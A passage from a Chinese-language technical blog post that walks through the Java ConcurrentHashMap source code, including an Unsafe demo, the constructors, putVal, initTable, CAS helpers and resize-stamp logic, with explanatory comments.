2.操作内存。eg: allocateMemory()、copyMemory()、freeMemory()</span></span><br><span class="line"><span class="comment"> *  - getXxx/getXxxVolatile 获取值</span></span><br><span class="line"><span class="comment"> *  - putXxx/putXxxVolatile 设置值</span></span><br><span class="line"><span class="comment"> * 3.对象相关。</span></span><br><span class="line"><span class="comment"> *  - allocateInstance() 获取实例（没有调用构造方法）</span></span><br><span class="line"><span class="comment"> *  - objectFieldOffset() 获取属性内存地址偏移量</span></span><br><span class="line"><span class="comment"> * 4.Class相关。eg: staticFieldOffset()、defineClass()、defineAnonymousClass()、ensureClassInitialized()</span></span><br><span class="line"><span class="comment"> * 5.数组相关。</span></span><br><span class="line"><span class="comment"> *  - arrayBaseOffset() 数组基础内存地址偏移量</span></span><br><span class="line"><span class="comment"> *  - arrayIndexScale() 数组元素内存地址偏移量</span></span><br><span class="line"><span class="comment"> * 6.Synchronization相关。eg: monitorEnter()、tryMonitorEnter()、monitorExit()、compareAndSwapInt()、putOrderedInt()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2024/1/25 13:12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String[] strArr = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Unsafe unsafe;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnsafeDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取Unsafe对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        unsafe = (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试使用Unsafe给数组插入元素、获取元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">testUnsafeArray</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> String[].class;</span><br><span class="line">        <span class="comment">// String数组基础内存地址偏移量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">baseOffset</span> <span class="operator">=</span> unsafe.arrayBaseOffset(clz);</span><br><span class="line">        <span class="comment">// 每个元素的内存地址偏移量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">scale</span> <span class="operator">=</span> unsafe.arrayIndexScale(clz);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 插入数组元素（方法1）。插入对象：strArr，下标：2，值：&quot;aaa&quot;</span></span><br><span class="line">        unsafe.putObject(strArr, (<span class="type">long</span>) (baseOffset + scale * <span class="number">2</span>), <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 插入数组元素（方法2）。插入对象：strArr，下标：5，值：&quot;xxx&quot;</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ashift</span> <span class="operator">=</span> <span class="number">31</span> - Integer.numberOfLeadingZeros(scale);</span><br><span class="line">        unsafe.putObject(strArr, (baseOffset + ((<span class="type">long</span>) <span class="number">5</span> &lt;&lt; ashift)), <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数组元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = strArr.length; i &lt; len; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; len - <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print(unsafe.getObject(strArr, (<span class="type">long</span>) baseOffset + scale * i) + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.print(unsafe.getObject(strArr, (<span class="type">long</span>) baseOffset + scale * i) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试使用Unsafe给int变量赋值、获取值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">testUnsafeInt</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">numOffset</span> <span class="operator">=</span> unsafe.objectFieldOffset(UnsafeDemo.class.getDeclaredField(<span class="string">&quot;num&quot;</span>));</span><br><span class="line">        unsafe.putObject(num, numOffset, <span class="number">666</span>);</span><br><span class="line">        System.out.println(unsafe.getObject(num, numOffset));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnsafeDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnsafeDemo</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试数组插入元素、获取元素</span></span><br><span class="line">        demo.testUnsafeArray();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        demo.testUnsafeInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-3-无参构造"><a href="#1-3-无参构造" class="headerlink" title="1.3 无参构造"></a>1.3 无参构造</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-new-ConcurrentHashMap-int-initialCapacity"><a href="#2-new-ConcurrentHashMap-int-initialCapacity" class="headerlink" title="2. new ConcurrentHashMap(int initialCapacity)"></a>2. new ConcurrentHashMap(int initialCapacity)</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="comment">// 初始化容器大于等于2^29，cap为2^30，否则，cap为不小于(Math.floor(初始化大小*1.5)+1)的最小2的整数次方。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((initialCapacity &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ?</span><br><span class="line">               MAXIMUM_CAPACITY :</span><br><span class="line">               tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">this</span>.sizeCtl = cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-1-tableSizeFor-int-c"><a href="#2-1-tableSizeFor-int-c" class="headerlink" title="2.1 tableSizeFor(int c)"></a>2.1 tableSizeFor(int c)</h2><p>返回不小于cap的最小2的整数次方，与HashMap中的tableSizeFor方法完全一样，具体可查看HashMap中对应分析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">tableSizeFor</span><span class="params">(<span class="type">int</span> c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> c - <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">4</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">8</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> (n &lt; <span class="number">0</span>) ? <span class="number">1</span> : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-new-ConcurrentHashMap-int-initialCapacity-float-loadFactor"><a href="#3-new-ConcurrentHashMap-int-initialCapacity-float-loadFactor" class="headerlink" title="3. new ConcurrentHashMap(int initialCapacity, float loadFactor)"></a>3. new ConcurrentHashMap(int initialCapacity, float loadFactor)</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity, <span class="type">float</span> loadFactor)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(initialCapacity, loadFactor, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-new-ConcurrentHashMap-int-initialCapacity-float-loadFactor-int-concurrencyLevel"><a href="#4-new-ConcurrentHashMap-int-initialCapacity-float-loadFactor-int-concurrencyLevel" class="headerlink" title="4. new ConcurrentHashMap(int initialCapacity, float loadFactor, int concurrencyLevel)"></a>4. new ConcurrentHashMap(int initialCapacity, float loadFactor, int concurrencyLevel)</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         <span class="type">float</span> loadFactor, <span class="type">int</span> concurrencyLevel)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(loadFactor &gt; <span class="number">0.0f</span>) || initialCapacity &lt; <span class="number">0</span> || concurrencyLevel &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="comment">// 若初始化容器大小小于并发级别，则初始化容器大小设定为并发级别大小。</span></span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; concurrencyLevel)   <span class="comment">// Use at least as many bins</span></span><br><span class="line">        initialCapacity = concurrencyLevel;   <span class="comment">// as estimated threads</span></span><br><span class="line">    <span class="comment">// 计算size = 指定容量/加载因子 + 1，初始化容量不小于tableSizeFor((int)size)，相对于HashMap不同，后者是tableSizeFor(initialCapacity)</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">size</span> <span class="operator">=</span> (<span class="type">long</span>)(<span class="number">1.0</span> + (<span class="type">long</span>)initialCapacity / loadFactor);</span><br><span class="line">    <span class="comment">// size &gt;= 2^30，cap为2^30，否则为不小于size的最小2的整数次方。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> (size &gt;= (<span class="type">long</span>)MAXIMUM_CAPACITY) ?</span><br><span class="line">        MAXIMUM_CAPACITY : tableSizeFor((<span class="type">int</span>)size);</span><br><span class="line">    <span class="built_in">this</span>.sizeCtl = cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-size"><a href="#5-size" class="headerlink" title="5. size()"></a>5. size()</h1><p>获取键值对的数量，范围：[0, Integer.MAX_VALUE]。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：5.1</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">n</span> <span class="operator">=</span> sumCount();</span><br><span class="line">    <span class="keyword">return</span> ((n &lt; <span class="number">0L</span>) ? <span class="number">0</span> :</span><br><span class="line">            (n &gt; (<span class="type">long</span>)Integer.MAX_VALUE) ? Integer.MAX_VALUE :</span><br><span class="line">            (<span class="type">int</span>)n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-1-sumCount"><a href="#5-1-sumCount" class="headerlink" title="5.1 sumCount()"></a>5.1 sumCount()</h2><p>键值对数量计数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 若counterCells不为null，返回baseCount + counterCells所有元素的value之和，否则返回baseCount。</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="title function_">sumCount</span><span class="params">()</span> &#123;</span><br><span class="line">    CounterCell[] as = counterCells; CounterCell a;</span><br><span class="line">    <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> baseCount;</span><br><span class="line">    <span class="keyword">if</span> (as != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; as.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((a = as[i]) != <span class="literal">null</span>)</span><br><span class="line">                sum += a.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-put-K-key-V-value"><a href="#6-put-K-key-V-value" class="headerlink" title="6. put(K key, V value)"></a>6. put(K key, V value)</h1><p>添加一组键值对。（key、value均不能为null）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：6.1</span></span><br><span class="line">    <span class="keyword">return</span> putVal(key, value, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-1-putVal-K-key-V-value-boolean-onlyIfAbsent"><a href="#6-1-putVal-K-key-V-value-boolean-onlyIfAbsent" class="headerlink" title="6.1 putVal(K key, V value, boolean onlyIfAbsent)"></a>6.1 putVal(K key, V value, boolean onlyIfAbsent)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(K key, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line">    <span class="comment">// key、value均不能为null</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || value == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="comment">// 获取key的hash值，详细：6.2</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line">    <span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="type">int</span> n, i, fh;</span><br><span class="line">        <span class="comment">// 容器为空，先初始化容器。初始化后，在后续循环中，在进行数据的插入。</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 初始化容器，详细：6.3</span></span><br><span class="line">            tab = initTable();</span><br><span class="line">        <span class="comment">// 数组下标(n - 1) &amp; hash的元素为null，直接在其下添加节点。详细：6.4</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i = (n - <span class="number">1</span>) &amp; hash)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 若tab[i] == null，则插入新节点，使用的是CAS（比较交换）。详细：6.5</span></span><br><span class="line">            <span class="keyword">if</span> (casTabAt(tab, i, <span class="literal">null</span>,</span><br><span class="line">                         <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key, value, <span class="literal">null</span>)))</span><br><span class="line">                <span class="keyword">break</span>;                   <span class="comment">// no lock when adding to empty bin</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 指定数组下标元素不为null，而且是ForwardingNode节点，表示正在扩容，则执行帮助扩容（详细：6.6）。建议先跳过，直到分析完扩容，再回头分析。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            tab = helpTransfer(tab, f);</span><br><span class="line">        <span class="comment">// 指定数组下标元素不为null，但不是ForwardingNode节点。</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    <span class="comment">// fh &gt;= 0，普通单链表节点。</span></span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        binCount = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">                            K ek;</span><br><span class="line">                            <span class="comment">// 若找到完全相同的key，替换旧值。</span></span><br><span class="line">                            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                                ((ek = e.key) == key ||</span><br><span class="line">                                 (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">                                oldVal = e.val;</span><br><span class="line">                                <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                    e.val = value;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            Node&lt;K,V&gt; pred = e;</span><br><span class="line">                            <span class="comment">// 链表尾部插入新节点。</span></span><br><span class="line">                            <span class="keyword">if</span> ((e = e.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                                pred.next = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key,</span><br><span class="line">                                                          value, <span class="literal">null</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// fh &lt; 0，而且是树形节点。</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">                        Node&lt;K,V&gt; p;</span><br><span class="line">                        binCount = <span class="number">2</span>;</span><br><span class="line">                        <span class="comment">// 查找或插入红黑树节点（详细：6.11），若返回值不为null，说明存在旧值，替换旧值。</span></span><br><span class="line">                        <span class="keyword">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class="line">                                                              value)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            oldVal = p.val;</span><br><span class="line">                            <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                p.val = value;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (binCount != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 当binCount为TREEIFY_THRESHOLD（即为8）时，链表长度已经是9，因为在最后添加了新的节点。进行树化，详细：6.21。</span></span><br><span class="line">                <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class="line">                    treeifyBin(tab, i);</span><br><span class="line">                <span class="keyword">if</span> (oldVal != <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> oldVal;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 容器键值对数量+1、扩容（若有必要），详细：6.24</span></span><br><span class="line">    addCount(<span class="number">1L</span>, binCount);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-spread-int-h"><a href="#6-2-spread-int-h" class="headerlink" title="6.2 spread(int h)"></a>6.2 spread(int h)</h2><p>与HashMap中的hash方法类似，但不全相同。这里h为key的hashCode（32位），无符号右移16位再与h做异或运算，再与HASH_BITS（符号位为0，其余为1）做按位与运算。结果：高16位不变，低16位与高16位做异或运算，最后符号位改为0，确保spread返回值为正数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">spread</span><span class="params">(<span class="type">int</span> h)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (h ^ (h &gt;&gt;&gt; <span class="number">16</span>)) &amp; HASH_BITS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-3-initTable"><a href="#6-3-initTable" class="headerlink" title="6.3 initTable()"></a>6.3 initTable()</h2><p>初始化容器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Node&lt;K,V&gt;[] initTable() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; <span class="type">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((tab = table) == <span class="literal">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// sizeCtl &lt; 0，让掉当前线程的cpu时间分片（运行状态-&gt;就绪状态）。目的：sc为负数时，让出资源以便快速完成初始化工作。</span></span><br><span class="line">        <span class="keyword">if</span> ((sc = sizeCtl) &lt; <span class="number">0</span>)</span><br><span class="line">            Thread.<span class="keyword">yield</span>(); <span class="comment">// lost initialization race; just spin</span></span><br><span class="line">        <span class="comment">// 若this内存地址偏移量为SIZECTL的值为sc，设置该值为-1（比较交换，这里把sizeCtl属性设为-1），然后返回true，否则直接返回false。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// sc大于0，说明初始化时指定了初始化容器大小，否则使用默认值16。</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> (sc &gt; <span class="number">0</span>) ? sc : DEFAULT_CAPACITY;</span><br><span class="line">                    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="comment">// 创建长度为n的Node数组，作为ConcurrentHashMap内部数据结构。</span></span><br><span class="line">                    Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n];</span><br><span class="line">                    table = tab = nt;</span><br><span class="line">                    <span class="comment">// 计算n的3/4，作为sc的值，即触发下次扩容的阈值。</span></span><br><span class="line">                    sc = n - (n &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 此时，sizeCtl记录的是下次扩容的阈值。</span></span><br><span class="line">                sizeCtl = sc;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-4-tabAt-Node-tab-int-i"><a href="#6-4-tabAt-Node-tab-int-i" class="headerlink" title="6.4 tabAt(Node&lt;K,V&gt;[] tab, int i)"></a>6.4 tabAt(Node&lt;K,V&gt;[] tab, int i)</h2><p>返回数组tab下标为i的元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> &lt;K,V&gt; Node&lt;K,V&gt; <span class="title function_">tabAt</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="comment">// 返回对象tab内存地址偏移量为((long)i &lt;&lt; ASHIFT) + ABASE的元素，具体可查看：1.2中testUnsafeArray()的方法2。</span></span><br><span class="line">    <span class="keyword">return</span> (Node&lt;K,V&gt;)U.getObjectVolatile(tab, ((<span class="type">long</span>)i &lt;&lt; ASHIFT) + ABASE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-5-casTabAt-Node-tab-int-i-Node-c-Node-v"><a href="#6-5-casTabAt-Node-tab-int-i-Node-c-Node-v" class="headerlink" title="6.5 casTabAt(Node&lt;K,V&gt;[] tab, int i, Node&lt;K,V&gt; c, Node&lt;K,V&gt; v)"></a>6.5 casTabAt(Node&lt;K,V&gt;[] tab, int i, Node&lt;K,V&gt; c, Node&lt;K,V&gt; v)</h2><p>若tab下标为i的对象为c，则用v替换c，使用的是CAS（比较交换）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> &lt;K,V&gt; <span class="type">boolean</span> <span class="title function_">casTabAt</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> i,</span></span><br><span class="line"><span class="params">                                    Node&lt;K,V&gt; c, Node&lt;K,V&gt; v)</span> &#123;</span><br><span class="line">    <span class="comment">// 若对象tab内存地址偏移量为((long)i &lt;&lt; ASHIFT) + ABASE的对象为c，则用v替换c。</span></span><br><span class="line">    <span class="keyword">return</span> U.compareAndSwapObject(tab, ((<span class="type">long</span>)i &lt;&lt; ASHIFT) + ABASE, c, v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分割线"><a href="#分割线" class="headerlink" title="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</h2><h2 id="6-6-helpTransfer-Node-tab-Node-f"><a href="#6-6-helpTransfer-Node-tab-Node-f" class="headerlink" title="6.6 helpTransfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt; f)"></a>6.6 helpTransfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt; f)</h2><p>帮助扩容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] helpTransfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt; f) &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] nextTab; <span class="type">int</span> sc;</span><br><span class="line">    <span class="comment">// 节点f为ForwardingNode节点，且其nextTable属性不为null。</span></span><br><span class="line">    <span class="keyword">if</span> (tab != <span class="literal">null</span> &amp;&amp; (f <span class="keyword">instanceof</span> ForwardingNode) &amp;&amp;</span><br><span class="line">        (nextTab = ((ForwardingNode&lt;K,V&gt;)f).nextTable) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 详细：6.7。</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rs</span> <span class="operator">=</span> resizeStamp(tab.length);</span><br><span class="line">        <span class="comment">// f为ForwardingNode节点，且sizeCtl &lt; 0</span></span><br><span class="line">        <span class="keyword">while</span> (nextTab == nextTable &amp;&amp; table == tab &amp;&amp;</span><br><span class="line">               (sc = sizeCtl) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                sc == rs + MAX_RESIZERS || transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 每循环扩容一次sc进行+1</span></span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, sc + <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="comment">// 扩容，详细：6.8。</span></span><br><span class="line">                transfer(tab, nextTab);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nextTab;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-7-resizeStamp-int-n"><a href="#6-7-resizeStamp-int-n" class="headerlink" title="6.7 resizeStamp(int n)"></a>6.7 resizeStamp(int n)</h2><p>获取扩容大小戳，相当于：2^15 + (一个[0, 32]范围的数)。其中这个数是数组长度n的二进制数字高位的0的个数。</p>
